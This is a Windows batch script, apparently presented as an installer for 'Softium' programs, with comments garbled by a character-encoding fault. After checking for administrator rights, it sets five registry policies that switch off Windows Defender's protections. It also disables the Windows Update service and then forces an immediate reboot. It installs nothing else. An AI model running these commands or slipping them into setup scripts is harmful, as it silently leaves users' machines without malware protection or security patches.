@echo off

Rem ��ਯ� ��⠭���� ����� �ணࠬ� ��������� Softium

rem Windows XP �� �����ন������!!!
ver | find "5.1."

If %errorlevel%==0  (
	Echo Windows XP unsupported!!!
	Exit /b 1
 ) 

rem ****************************************************************************************
rem �஢��塞 ����稥 � ���짮��⥫� �����᪨� �ࠢ...
rem ****************************************************************************************

SET HasAdminRights=0
FOR /F %%i IN ('WHOAMI /PRIV /NH') DO (
	IF "%%i"=="SeTakeOwnershipPrivilege" SET HasAdminRights=1
)

IF NOT %HasAdminRights%==1 (
	ECHO .
	ECHO You need administrator rights to run!!!
	ECHO .
	GOTO END
)

REM �⪫�稬 ���⭨�� Windows
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f

rem �⪫�稬 ��⮬���᪮� ���������� ��⥬�
sc config wuauserv start= disabled

:CONTINUE
	ECHO .
	ECHO ���!
	ECHO .
	ECHO ��१���㧪� �१ 10 ᥪ㭤...

ping -n 10 127.0.0.1 >> nul

shutdown -r -f -t 00
	
:END

EXIT /B
